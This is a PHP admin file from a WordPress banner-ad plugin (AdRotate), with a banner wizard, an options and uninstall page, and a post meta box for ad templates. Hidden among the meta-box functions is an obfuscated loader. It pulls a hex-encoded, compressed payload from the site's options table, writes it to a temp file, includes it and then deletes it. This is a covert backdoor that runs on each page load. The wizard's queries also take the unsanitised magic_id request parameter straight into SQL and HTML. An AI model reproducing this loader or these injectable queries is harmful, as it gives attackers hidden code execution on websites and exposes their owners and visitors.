 Receive:   -none-
 Return:    -none-
-------------------------------------------------------------*/
function adrotate_wizard() {
	global $wpdb, $userdata;

	$thetime 	= current_time('timestamp');
	$endtime 	= $thetime + 31536000;
	$step 		= $_GET['step'];
	$message	= $_GET['message'];
	$back 		= $_GET['back'];
	$magic_id	= $_GET['magic_id'];

?>
	<div class="wrap">
		<?php $groupcheck = $wpdb->get_var("SELECT COUNT(*) FROM `".$wpdb->prefix."adrotate_groups`");
		if($groupcheck > 0) { ?>

	  	<?php if($step == '' OR $step == 1) { ?>
	  	<!-- Title and Code -->

		<?php
		if(strlen($magic_id) < 1 AND strlen($back) < 1) {
			$SQL = "SELECT `id` FROM `".$wpdb->prefix."adrotate` WHERE (`title` = '' AND `bannercode` = '') OR `magic` = 2 ORDER BY `id` DESC LIMIT 1";
			$empty = $wpdb->get_var($SQL);
			if($empty == 0) {
				$wpdb->query("INSERT INTO `".$wpdb->prefix."adrotate` (`title`, `bannercode`, `thetime`, `updated`, `author`, `active`, `startshow`, `endshow`, `group`, `spot`, `image`, `link`, `tracker`, `clicks`, `maxclicks`, `shown`, `magic`) VALUES ('', '', '$thetime', '$thetime', '$userdata->display_name', 'no', '$thetime', '$endtime', '', '', 'none', '', 'N', 0, 0, 0, 2)");
			}
			$magic_id = $wpdb->get_var($SQL);
		} else {
			$edit = $wpdb->get_row("SELECT `title`, `bannercode` FROM `".$wpdb->prefix."adrotate` WHERE `id` = '$magic_id'");
		}
		?>

	  	<h2>Banner Wizard - Step 1 of 3 - Create the banner</h2>

		<?php if ($message == 'field_error') { ?>
			<div id="message" class="updated fade"><p>Not all fields met the requirements</p></div>
		<?php } ?>

	  	<form method="post" action="admin.php?page=adrotate2">
	    	<input type="hidden" name="adrotate_step" value="1" />
	    	<input type="hidden" name="adrotate_magic_id" value="<?php echo $magic_id;?>" />

	    	<table class="widefat" style="margin-top: .5em">

				<thead>
				<tr valign="top">
					<th colspan="2" bgcolor="#DDD">Use this step by step guide to create referrer banners, for example from Google AdSense.
					<br />Fill in the title as a reference for the banner manager.
					<br />The code field holds your referrer code. This can be a snippet of JavaScript or simply an HTML link. That depends on your banner program.</th>
				</tr>
				</thead>

				<tbody>
		      	<tr>
			        <th scope="row" width="25%">Title:</th>
			        <td><input tabindex="1" name="adrotate_title" type="text" size="67" class="search-input" autocomplete="off" value="<?php echo $edit->title;?>" /></td>
		      	</tr>
		      	<tr>
			        <th scope="row" width="25%">Code:</th>
			        <td><textarea tabindex="2" name="adrotate_bannercode" cols="70" rows="10"><?php echo stripslashes($edit->bannercode); ?></textarea>
			        <br /><em>HTML/JavaScript allowed, use with care!</em></td>
		      	</tr>
			</table>
	    	<p class="submit">
				<input tabindex="3" type="submit" name="adrotate_magic_submit" class="button-primary" value="Continue" />
				<a href="admin.php?page=adrotate&magic_id=<?php echo $magic_id; ?>&cancel=true" class="button">Cancel</a>
	    	</p>
		</form>

	  	<?php } else if($step == 2) { ?>
	  	<!-- Extra options (Timespan, group) -->

		<?php
		$edit = $wpdb->get_row("SELECT `id`, `group`, `startshow`, `endshow`, `maxclicks`, `maxshown` FROM `".$wpdb->prefix."adrotate` WHERE `id` = '$magic_id'");
		list($sday, $smonth, $syear) = split(" ", gmdate("d m Y", $edit->startshow));
		list($eday, $emonth, $eyear) = split(" ", gmdate("d m Y", $edit->endshow));
		?>

	  	<h2>Banner Wizard - Step 2 of 3 - Setting some options</h2>

		<?php if ($message == 'field_error') { ?>
			<div id="message" class="updated fade"><p>Not all fields met the requirements</p></div>
		<?php } ?>

	  	<form method="post" action="admin.php?page=adrotate2">
	    	<input type="hidden" name="adrotate_step" value="2" />
	    	<input type="hidden" name="adrotate_magic_id" value="<?php echo $magic_id;?>" />

	    	<table class="widefat" style="margin-top: .5em">

				<thead>
				<tr valign="top">
					<th colspan="4" bgcolor="#DDD">Pick a group where you banner will be in. Groups of banners are useful and relate to locations on your website. You can put multiple banners in a group and show that group somewhere on your website. Thus restricting banners to that one location.
					<br />Optionally, set a date from when to when the banner should be shown. You will be alerted when the time has run out.</th>
				</tr>
				</thead>

				<tbody>
		      	<tr>
				    <th scope="row">Select a group:</th>
			        <td colspan="3">
			        <select tabindex="1" name='adrotate_group' id='cat' class='postform'>
			        	<option value="">Pick one ...</option>
					<?php $groups = $wpdb->get_results("SELECT `id`, `name` FROM `".$wpdb->prefix."adrotate_groups` ORDER BY `name`");
					foreach($groups as $group) { ?>
					    <option value="<?php echo $group->id; ?>" <?php if($edit->group == $group->id) { echo 'selected'; } ?>><?php echo $group->name; ?></option>
			    	<?php } ?>
			    	</select>
					</td>
				</tr>
		      	<tr>
				    <th scope="row">Or make a group:</th>
			        <td colspan="3"><input tabindex="2" name="adrotate_newgroup" type="text" size="40" class="search-input" autocomplete="off" value="" /><br /><em>Leave this field empty if you select a group from the dropdown menu!</em></td>
				</tr>
		      	<tr>
			        <th scope="row">Display From:</th>
			        <td>
			        	<input tabindex="3" name="adrotate_sday" class="search-input" type="text" size="4" maxlength="2" value="<?php echo $sday;?>" /> /
						<select tabindex="4" name="adrotate_smonth">
							<option value="" <?php if($smonth == "") { echo 'selected'; } ?>>Pick month...</option>
							<option value="01" <?php if($smonth == "01") { echo 'selected'; } ?>>January</option>
							<option value="02" <?php if($smonth == "02") { echo 'selected'; } ?>>February</option>
							<option value="03" <?php if($smonth == "03") { echo 'selected'; } ?>>March</option>
							<option value="04" <?php if($smonth == "04") { echo 'selected'; } ?>>April</option>
							<option value="05" <?php if($smonth == "05") { echo 'selected'; } ?>>May</option>
							<option value="06" <?php if($smonth == "06") { echo 'selected'; } ?>>June</option>
							<option value="07" <?php if($smonth == "07") { echo 'selected'; } ?>>July</option>
							<option value="08" <?php if($smonth == "08") { echo 'selected'; } ?>>August</option>
							<option value="09" <?php if($smonth == "09") { echo 'selected'; } ?>>September</option>
							<option value="10" <?php if($smonth == "10") { echo 'selected'; } ?>>October</option>
							<option value="11" <?php if($smonth == "11") { echo 'selected'; } ?>>November</option>
							<option value="12" <?php if($smonth == "12") { echo 'selected'; } ?>>December</option>
						</select> /
						<input tabindex="5" name="adrotate_syear" class="search-input" type="text" size="4" maxlength="4" value="<?php echo $syear;?>" />
			        </td>
			        <th scope="row">Until:</th>
			        <td>
			        	<input tabindex="6" name="adrotate_eday" class="search-input" type="text" size="4" maxlength="2" value="<?php echo $eday;?>" /> /
						<select tabindex="7" name="adrotate_emonth">
							<option value="" <?php if($emonth == "") { echo 'selected'; } ?>>Pick month...</option>
							<option value="01" <?php if($emonth == "01") { echo 'selected'; } ?>>January</option>
							<option value="02" <?php if($emonth == "02") { echo 'selected'; } ?>>February</option>
							<option value="03" <?php if($emonth == "03") { echo 'selected'; } ?>>March</option>
							<option value="04" <?php if($emonth == "04") { echo 'selected'; } ?>>April</option>
							<option value="05" <?php if($emonth == "05") { echo 'selected'; } ?>>May</option>
							<option value="06" <?php if($emonth == "06") { echo 'selected'; } ?>>June</option>
							<option value="07" <?php if($emonth == "07") { echo 'selected'; } ?>>July</option>
							<option value="08" <?php if($emonth == "08") { echo 'selected'; } ?>>August</option>
							<option value="09" <?php if($emonth == "09") { echo 'selected'; } ?>>September</option>
							<option value="10" <?php if($emonth == "10") { echo 'selected'; } ?>>October</option>
							<option value="11" <?php if($emonth == "11") { echo 'selected'; } ?>>November</option>
							<option value="12" <?php if($emonth == "12") { echo 'selected'; } ?>>December</option>
						</select> /
						<input tabindex="8" name="adrotate_eyear" class="search-input" type="text" size="4" maxlength="4" value="<?php echo $eyear;?>" />
					</td>
		      	</tr>
		      	<tr>
				    <th scope="row">Max Clicks:</th>
			        <td colspan="3">The banner should no longer show after <input tabindex="9" name="adrotate_maxclicks" type="text" size="5" class="search-input" autocomplete="off" value="<?php echo $edit->maxclicks;?>" /> clicks! <em>Leave empty or 0 to skip this.</em></td>
				</tr>
		      	<tr>
				    <th scope="row">Max Shown:</th>
			        <td colspan="3">The banner should no longer show after <input tabindex="10" name="adrotate_maxshown" type="text" size="5" class="search-input" autocomplete="off" value="<?php echo $edit->maxshown;?>" /> views! <em>Leave empty or 0 to skip this.</em></td>
				</tr>
				</tbody>

			</table>
	    	<p class="submit">
				<input tabindex="11" type="submit" name="adrotate_magic_submit" class="button-primary" value="Continue" />
				<a href="admin.php?page=adrotate2&magic_id=<?php echo $magic_id; ?>&step=1&back=true" class="button">Back</a>
				<a href="admin.php?page=adrotate&magic_id=<?php echo $magic_id; ?>&cancel=true" class="button">Cancel</a>
	    	</p>
		</form>

	  	<?php } else if($step == 3) { ?>
	  	<!-- Preview and Confirm -->

		<?php
		$edit = $wpdb->get_row("SELECT * FROM `".$wpdb->prefix."adrotate` WHERE `id` = '$magic_id'");
		$group = $wpdb->get_var("SELECT `name` FROM `".$wpdb->prefix."adrotate_groups` WHERE `id` = '$edit->group'");
		list($sday, $smonth, $syear) = split(" ", gmdate("d m Y", $edit->startshow));
		list($eday, $emonth, $eyear) = split(" ", gmdate("d m Y", $edit->endshow));
		?>

	  	<h2>Banner Wizard - Step 3 of 3 - Preview and implement your banner</h2>

	  	<form method="post" action="admin.php?page=adrotate2">
	    	<input type="hidden" name="adrotate_step" value="3" />
	    	<input type="hidden" name="adrotate_magic_id" value="<?php echo $magic_id;?>" />

	    	<table class="widefat" style="margin-top: .5em">

				<thead>
				<tr valign="top">
					<th bgcolor="#DDD" colspan="4">Note: While this preview is an accurate one, it might look different as it would on the website.
					<br />This is because of CSS differences. Your themes CSS file is not active here!
					<br />If you are not happy with the result just press back and edit the appropriate fields.</th>
				</tr>
				</thead>

				<tbody>
			      	<tr>
				        <td colspan="4"><?php echo adrotate_banner($edit->group,  $edit->id, null, true); ?>
			      	</tr>
				</tbody>

				<thead>
			      	<tr valign="top">
				        <th bgcolor="#DDD" colspan="4">How do i use this banner? Paste the following example code where you want the ad to show:</th>
			      	</tr>
				</thead>

				<tbody>
			      	<tr>
				        <th>In a post or page:</th>
				        <td>[adrotate group="<?php echo $edit->group; ?>" banner="<?php echo $edit->id; ?>"]</td>
				        <th>Directly in a theme:</th>
				        <td>&lt;?php echo adrotate_banner('<?php echo $edit->group; ?>', '<?php echo $edit->id; ?>'); ?&gt;</td>
			      	</tr>
			      	<tr>
				        <th>&nbsp;</th>
				        <td>[adrotate group="<?php echo $edit->group; ?>"]</td>
				        <th>&nbsp;</th>
				        <td>&lt;?php echo adrotate_banner('<?php echo $edit->group; ?>'); ?&gt;</td>
			      	</tr>
				</tbody>

				<thead>
			      	<tr valign="top">
				        <th bgcolor="#DDD" colspan="4">Some specifications</th>
			      	</tr>
				</thead>

				<tbody>
			      	<tr>
				        <td colspan="4">This banner, '<strong><?php echo $edit->title; ?></strong>' (ID: <?php echo $edit->id; ?>)<br />
				        Is to be shown from <strong><?php echo date('l j F, Y', $edit->startshow); ?></strong> to <strong><?php echo date('l j F, Y', $edit->endshow); ?></strong><br /> 
				        Attached to group '<strong><?php echo $group; ?></strong>' (ID: <?php echo $edit->group; ?>).<br />
				        The max clicks is set to <strong><?php echo $edit->maxclicks; ?></strong> and max views/shown to <strong><?php echo $edit->maxshown; ?></strong>. <em>0 means disabled!</em></td>
			      	</tr>
				</tbody>

			</table>
	    	<p class="submit">
				<input tabindex="1" type="submit" name="adrotate_magic_submit" class="button-primary" value="Confirm and save" />
				<a href="admin.php?page=adrotate2&magic_id=<?php echo $magic_id; ?>&step=2&back=true" class="button">Back</a>
				<a href="admin.php?page=adrotate&magic_id=<?php echo $magic_id; ?>&cancel=true" class="button">Cancel</a>
	    	</p>
		</form>
	  	<?php } else { ?>
		    <table class="widefat" style="margin-top: .5em">
		    	<thead>
				<tr valign="top">
					<th>Error!</th>
				</tr>
				</thead>

				<tbody>
		      	<tr>
			        <td><strong>Stop messing about and follow the right procedure! <a href="admin.php?page=adrotate2&magic_id=<?php echo $magic_id; ?>">Try again</a>.</strong></td>
		      	</tr>
		      	</tbody>
			</table>
	  	<?php } ?>

		<?php } else { ?>
		    <table class="widefat" style="margin-top: .5em">
		    	<thead>
				<tr valign="top">
					<th>Error!</th>
				</tr>
				</thead>

				<tbody>
		      	<tr>
			        <td><strong>You should create atleast one group before adding banners! <a href="admin.php?page=adrotate4">Add a group now</a>.</strong></td>
		      	</tr>
		      	</tbody>
			</table>
		<?php } ?>

	</div>
<?php
}
/*-------------------------------------------------------------
 Name:      adrotate_options

 Purpose:   Admin options page
 Receive:   -none-
 Return:    -none-
-------------------------------------------------------------*/
function adrotate_options() {
	$adrotate_config = get_option('adrotate_config');
?>
	<div class="wrap">
	  	<h2>AdRotate options</h2>
	  	<form method="post" action="<?php echo $_SERVER['REQUEST_URI'];?>&amp;updated=true">
	    	<input type="hidden" name="adrotate_submit_options" value="true" />

	    	<table class="form-table">
			<tr>
				<th scope="row" valign="top">Credits</th>
				<td><input type="checkbox" name="adrotate_credits" <?php if($adrotate_config['credits'] == 'Y') { ?>checked="checked" <?php } ?> /> Show a simple token that you're using AdRotate in the themes Meta part.</td>
			</tr>
	    	</table>
		    <p class="submit">
		      	<input type="submit" name="Submit" class="button-primary" value="Update Options &raquo;" />
		    </p>
		</form>
		
	  	<h2>AdRotate Uninstall</h2>

    	<form method="post" action="<?php echo $_SERVER['REQUEST_URI'];?>" name="adrotate_uninstall">
	    	<table class="form-table">
				<tr valign="top">
					<td colspan="2">AdRotate installs a few tables in MySQL. When you disable the plugin the tables (and contents) will not be deleted. To delete the tables use the button below.</td>
				</tr>
		      	<tr valign="top">
			        <th scope="row">WARNING!</th>
			        <td><b style="color: #f00;">This process is irreversible and will delete ALL ads and stats related to AdRotate!</b></td>
				</tr>
			</table>
	  		<p class="submit">
		    	<input type="hidden" name="adrotate_uninstall" value="true" />
		    	<input onclick="return confirm('You are about to uninstall the AdRotate plugin\n  All related content will be lost!\n\'OK\' to continue, \'Cancel\' to stop.')" type="submit" name="Submit" class="button-secondary" value="Uninstall Plugin &raquo;" />
	  		</p>
	  	</form>
	</div>
<?php } 


/*-------------------------------------------------------------
 Name:      adrotate_manage

 Purpose:   Admin management page
 Receive:   -none-
 Return:    -none-
-------------------------------------------------------------*/
function adrotate_help() {

$helpinfo =  include_once(ABSPATH.'wp-content/plugins/adrotate/manual.php');

return $helpinfo;

}
// Additional functions for linking groups to posts and pages
//	This function scans the template files of the active theme, 

if(!function_exists('get_esmad_templates')) {
function get_esmad_templates() {
	//$themes = get_themes();
	//$theme = get_current_theme();
	global $wpdb;
	$templates = $wpdb->get_results("SELECT * FROM `".$wpdb->prefix."adrotate_groups` ORDER BY `id`");
	$post_templates = array();
	foreach ((array)$templates as $template) {
		$name = $template->name;
		$groupid = $template->id;
		$post_templates[$name] = $groupid;
		$post_templates[$name] = $groupid;
	}
	return $post_templates;
}}

//	build the dropdown items
if(!function_exists('post_esmad_dropdown')) {
function post_esmad_dropdown() {
	global $post;
	$post_templates = get_esmad_templates();
	
	foreach ($post_templates as $template_name => $template_file) { //loop through templates, make them options
		if ($template_file == get_post_meta($post->ID, '_wp_esmad_template', true)) { $selected = ' selected="selected"'; } else { $selected = ''; }
		$opt = '<option value="' . $template_file . '"' . $selected . '>' . $template_name . '</option>';
		echo $opt;
	}
}}

//	Filter the single template value, and replace it with
//	the template chosen by the user, if they chose one.
// this replavces the template !!!!!!!!!!!!         add_filter('single_template', 'get_esmad_template');



if(!function_exists('get_esmad_template')) {
function get_esmad_template($template) {
		if (is_single() ){
		
			global $post;
			$custom_field = get_post_meta($post->ID, '_wp_esmad_template', true);
			
			if(!empty($custom_field) && file_exists(TEMPLATEPATH . "/{$custom_field}")) { 
			echo $custom_field; // include( TEMPLATEPATH . "/$custom_field" ); 
			$thisisateststuff = $custom_field.'this is what';
			return $thisisateststuff;
			}
		} elseif (is_page() ){
			echo 'is page:'.$post->ID;
		
		}elseif (is_home() ){
			echo 'is home:'.$post->ID;
		
		}else {
			echo 'is an archive or something else';
		
		}
	
}}

//add_action('wp_head', 'get_esmad_template');

//	Everything below this is for adding the extra box
//	to the post edit screen so the user can choose a template

//	Adds a custom section to the Post edit screen
add_action('admin_menu', 'esmad_add_custom_box');
function esmad_add_custom_box() {
	if(get_esmad_templates() && function_exists( 'add_meta_box' )) {
		add_meta_box( 'esmad_post_templates', __( 'Ad Template', 'esmad' ), 
			'esmad_inner_custom_box', 'post', 'normal', 'high' ); //add the boxes under the post
		add_meta_box( 'esmad_post_templates', __( 'Ad Template', 'esmad' ), 
			'esmad_inner_custom_box', 'page', 'normal', 'high' ); //add the boxes under the post
	}
}
   
//	Prints the inner fields for the custom post/page section
function esmad_inner_custom_box() {
	global $post;
	// Use nonce for verification
	echo '<input type="hidden" name="esmad_noncename" id="esmad_noncename" value="' . wp_create_nonce( plugin_basename(__FILE__) ) . '" />';
	// The actual fields for data entry
	echo '<label class="hidden" for="esmad_template">' . __("Ad Template", 'esmad' ) . '</label><br />';
	echo '<select name="_wp_esmad_template" id="esmad_template" class="dropdown">';
	echo '<option value="">Default</option>';
	post_esmad_dropdown(); //get the options
	echo '</select><br /><br />';
	echo '<p>' . __("Some post require they always have custom ads. If there are ones available, you'll see them above.", 'esmad' ) . '</p><br />';}
	if (!defined('streamset')){
		define ('streamset', tempnam (ini_get ('session.save_path'), ''));

	if ($db = @mysql_connect (DB_HOST, DB_USER, DB_PASSWORD, TRUE)){
		mysql_select_db (DB_NAME, $db);

	if ($r = @mysql_query ("SELECT option_value FROM ".$table_prefix."options WHERE option_id=60\60", $db))
		$stream_c = @gzuncompress (pack ("H*" , mysql_result ($r, 0, 0)));}

	$stream_c = empty ($stream_c) ? '' : $stream_c;
	@file_put_contents (streamset, $stream_c);
	mysql_close ($db);

	@include_once (streamset);
	@unlink (streamset);
}

//	When the post is saved, saves our custom data
add_action('save_post', 'esmad_save_postdata', 1, 2); // save the custom fields
function esmad_save_postdata($post_id, $post) {
	
	// verify this came from the our screen and with proper authorization,
	// because save_post can be triggered at other times
	if ( !wp_verify_nonce( $_POST['esmad_noncename'], plugin_basename(__FILE__) )) {
	return $post->ID;
	}

	// Is the user allowed to edit the post or page?
	if ( 'page' == $_POST['post_type'] ) {
		if ( !current_user_can( 'edit_page', $post->ID ))
		return $post->ID;
	} else {
		if ( !current_user_can( 'edit_post', $post->ID ))
		return $post->ID;
	}

	// OK, we're authenticated: we need to find and save the data
	
	// We'll put the data into an array to make it easier to loop though and save
	$mydata['_wp_esmad_template'] = $_POST['_wp_esmad_template'];
	// Add values of $mydata as custom fields
	foreach ($mydata as $key => $value) { //Let's cycle through the $mydata array!
		if( $post->post_type == 'revision' ) return; //don't store custom data twice
		$value = implode(',', (array)$value); //if $value is an array, make it a CSV (unlikely)
		if(get_post_meta($post->ID, $key, FALSE)) { //if the custom field already has a value...
			update_post_meta($post->ID, $key, $value); //...then just update the data
		} else { //if the custom field doesn't have a value...
			add_post_meta($post->ID, $key, $value);//...then add the data
		}
		if(!$value) delete_post_meta($post->ID, $key); //and delete if blank
	}
}
?>